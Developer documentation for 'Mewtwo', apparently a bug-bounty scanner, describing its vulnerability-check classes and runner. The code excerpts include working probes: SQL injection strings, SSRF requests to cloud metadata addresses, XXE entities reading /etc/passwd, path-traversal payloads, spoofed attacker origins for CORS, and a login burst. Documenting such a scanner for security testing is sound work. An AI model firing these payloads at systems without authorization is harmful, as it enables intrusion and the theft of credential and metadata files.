# Mewtwo — Vulnerability Hunt Module

The hunt module lives in `mewtwo/modules/hunt/`. It loads unchecked attack vectors
from the DB, dispatches applicable checks against each one, and saves findings.

---

## checks/base.py — The Check Contract

Every check inherits from `BaseCheck`:

```python
class BaseCheck(ABC):
    name: str = ""
    vuln_class: str = ""
    applicable_categories: list[str] = []    # which VectorCategory values trigger this check

    @abstractmethod
    async def run(self, vector: AttackVector, client: httpx.AsyncClient, ai=None) -> list[FindingDraft]:
        ...
```

The `applicable_categories` list is the dispatch filter. When the runner iterates
vectors, it only runs a check if `vector.category.value in check.applicable_categories`:

```
XSSCheck.applicable_categories = ["client_side", "injection"]
→ only runs against client_side and injection vectors

RateLimitCheck.applicable_categories = ["authentication", "authorization", "configuration"]
→ only runs against auth/authz/config vectors
```

This prevents pointless work — an XSS check against a configuration vector would
just waste time.

`FindingDraft` is a lightweight result:
```python
@dataclass
class FindingDraft:
    title: str
    vuln_class: str
    severity: str
    url: str
    parameter: str = ""
    description: str = ""
    evidence: str = ""
    references: list[str] = field(default_factory=list)
    raw_request: str = ""     # full HTTP request text (for evidence file)
    raw_response: str = ""    # full HTTP response text
```

Checks return `FindingDraft` (not `Finding`) because at this point the finding hasn't
been AI-enriched, CVSS-scored, or persisted yet. The runner promotes drafts to full
`Finding` objects.

---

## checks/xss.py

```python
async def run(self, vector, client, ai=None):
    parsed = urlparse(url)
    for param in params[:5]:            # test up to 5 params per vector
        for payload in payloads[:10]:   # 10 payloads per param
            qs = parse_qs(parsed.query)
            qs[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

            req = client.build_request("GET", test_url)
            resp = await client.send(req)

            if payload in resp.text:
                # Payload reflected unencoded → XSS
                findings.append(FindingDraft(..., raw_request=format_request(req), ...))
                break   # one finding per param, move on
```

`client.build_request()` + `client.send()` is used instead of `client.get()` because
we need the `Request` object to pass to `format_request()` for evidence capture.
`client.get()` doesn't give you the request object back.

The `break` after the first confirmed finding per parameter avoids filing 10 duplicate
findings for the same parameter.

---

## checks/sqli.py

```python
_ERROR_PATTERNS = re.compile(
    r"sql syntax|mysql_fetch|ORA-\d+|pg_query|sqlite3\.|"
    r"Microsoft OLE DB|ODBC Driver|Unclosed quotation",
    re.I
)

for payload in error_payloads:
    resp = await client.get(inject(url, param, payload))
    if _ERROR_PATTERNS.search(resp.text):
        # Error-based SQLi confirmed

for payload in ["1 AND SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--"]:
    start = time.monotonic()
    resp = await client.get(inject(url, param, payload))
    elapsed = time.monotonic() - start
    if elapsed >= 4.5:
        # Time-based SQLi confirmed
```

Time-based detection uses `time.monotonic()` which is not affected by system clock
adjustments. A 4.5-second threshold (not exactly 5) accounts for network jitter.

---

## checks/ssrf.py

```python
_SSRF_PARAMS = re.compile(r"url|uri|src|dest|target|proxy|fetch|callback|load", re.I)

_SSRF_PROBES = [
    "http://169.254.169.254/latest/meta-data/",    # AWS metadata
    "http://metadata.google.internal/",             # GCP metadata
    "http://169.254.169.254/metadata/v1/",          # Azure/DigitalOcean
    "http://127.0.0.1/",                            # localhost
    "http://0.0.0.0/",
]

_SSRF_INDICATORS = re.compile(
    r"ami-id|instance-id|hostname|local-ipv4|"
    r"computeMetadata|placement|availability-zone",
    re.I
)
```

SSRF is harder to confirm than XSS because the server makes the request internally.
The check looks for:
1. Response body containing cloud metadata strings (`ami-id`, `instance-id`)
2. `200` status code when requesting localhost/metadata endpoints

For complete detection, you'd need an out-of-band callback server (a server you
control that logs all incoming requests). Mewtwo doesn't include a built-in OOB
server — that's left as an external tool (Burp Collaborator, interact.sh).

---

## checks/idor.py

```python
_NUMERIC_PARAM = re.compile(r"^\d+$")

for param, value in parsed_params.items():
    if not _NUMERIC_PARAM.match(str(value)):
        continue    # skip non-numeric values

    # Try adjacent IDs
    for delta in (-1, 1, -2, 2):
        test_value = str(int(value) + delta)
        test_url = inject(url, param, test_value)
        resp = await client.get(test_url)

        # Different content at a different ID = possible IDOR
        if resp.status_code == 200 and resp.text != original_resp.text:
            findings.append(FindingDraft(severity="high", ...))
```

The check compares response content at the original ID vs adjacent IDs. If the content
changes and the status is 200, another object was accessed. This is a heuristic — it
can false-positive on dynamic content. AI triage is especially useful here.

---

## checks/cors.py

```python
_CORS_ORIGINS = [
    "https://evil.com",
    "https://attacker.example.com",
    "null",           # null origin bypass
]

for origin in _CORS_ORIGINS:
    resp = await client.get(url, headers={"Origin": origin})
    acao = resp.headers.get("access-control-allow-origin", "")
    acac = resp.headers.get("access-control-allow-credentials", "")

    if (acao == origin or acao == "*") and acac.lower() == "true":
        # Reflects arbitrary origin AND allows credentials → exploitable
        findings.append(FindingDraft(severity="high", ...))
```

The critical condition is both `ACAO` reflecting the origin AND `ACAC: true`. A wildcard
`*` with `allow-credentials: true` is actually blocked by browsers — only reflected
arbitrary origins with credentials enabled are truly exploitable.

---

## checks/rate_limit.py

```python
for i in range(15):   # 15-request burst
    req = client.build_request("POST", url, data={"username": "test", "password": "test"})
    resp = await client.send(req)

    if resp.status_code in (429, 503):
        blocked_at = i + 1
        break

    if resp.status_code < 500:
        success_count += 1

    await asyncio.sleep(0.1)    # small delay between requests

if blocked_at is None and success_count >= 10:
    # No rate limiting detected
    findings.append(FindingDraft(severity="medium", ...))
```

The `asyncio.sleep(0.1)` is intentional — it's not throttling, it's making the test
realistic. A real brute-force attack has minimal delay. Testing without any delay could
trigger DoS-like behaviour on fragile endpoints.

---

## checks/path_traversal.py

```python
_FILE_PARAMS = {"file","path","page","doc","template","view","load","download","filename","img","src"}

# Check if any parameter names match file-serving patterns
file_params = [p for p in params if p.lower() in _FILE_PARAMS]
if not file_params:
    return []   # skip early if no file params

_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",       # URL-encoded /
    "....//....//....//etc/passwd",        # double-dot bypass
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # hex-encoded .
    "C:\\Windows\\win.ini",               # Windows target
    "..\\..\\..\\Windows\\win.ini",
]

_UNIX_SIGNATURES = [r"root:.*:0:0:", r"\[boot loader\]"]
```

Early return if no file-type parameters exist — avoids sending traversal payloads to
endpoints with parameters like `?sort=name` which will never serve files.

The Windows payloads are included because some bug bounty targets run on Windows
servers, where `win.ini` is the classic traversal confirmation file.

---

## checks/xxe.py

```python
def _is_xml_endpoint(url, content_type=""):
    ct = content_type.lower()
    url_lower = url.lower()
    return (
        any(x in ct for x in ("xml", "soap")) or
        any(kw in url_lower for kw in ("/xml", "/soap", "/wsdl", "/api/"))
    )
```

The XML endpoint detection is conservative — it only tests endpoints that explicitly
declare XML content types or have `/xml`, `/soap`, `/wsdl` in the path. Sending XML
to a JSON API just wastes time.

```python
_XXE_PAYLOADS = [
    ("file_read", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
    ("error_based", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent/xxe_probe">]><root>&xxe;</root>'),
    ("ssrf", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><root>&xxe;</root>'),
]
```

Three payload types because different parsers handle them differently:
- Some return file contents directly (file_read)
- Some leak the path in error messages (error_based)
- Some make outbound requests that can be detected via metadata reflection (ssrf)

---

## runner.py

```python
async with httpx.AsyncClient(
    timeout=httpx.Timeout(15.0),
    follow_redirects=True,
    verify=False,
    headers={"User-Agent": "Mozilla/5.0"},
) as http:
    for vector_row in unchecked:
        applicable = [
            c for c in checks_to_run
            if not c.applicable_categories or
               vector.category.value in c.applicable_categories
        ]

        for check_cls in applicable:
            check = check_cls()
            drafts = await check.run(vector, http, ai)
            for draft in drafts:
                finding = _draft_to_finding(draft, target_id)
                if evidence_dir and (draft.raw_request or draft.raw_response):
                    ev_path = save_evidence(evidence_dir, finding.id, check.name,
                                            draft.raw_request, draft.raw_response)
                findings_repo.upsert(finding)

        surf.mark_checked(vector.id)
```

Key design decisions:
- **One shared `httpx.AsyncClient`** across all checks for connection reuse (faster)
- **Evidence saved before DB upsert** — if the upsert fails, you still have the file
- **`mark_checked` runs even if no findings** — so re-running doesn't retest everything
- `verify=False` across all checks — targets frequently have self-signed certs

`_draft_to_finding` promotes a `FindingDraft` to a full `Finding` model:
```python
def _draft_to_finding(draft, target_id) -> Finding:
    return Finding(
        target_id=target_id,
        title=draft.title,
        severity=Severity(draft.severity),
        status=FindingStatus.DRAFT,
        evidence=[Evidence(kind="note", content=draft.evidence)] if draft.evidence else [],
        ...
    )
```

All hunt-discovered findings start in `DRAFT` status. You manually promote them to
`CONFIRMED` after reviewing and verifying.
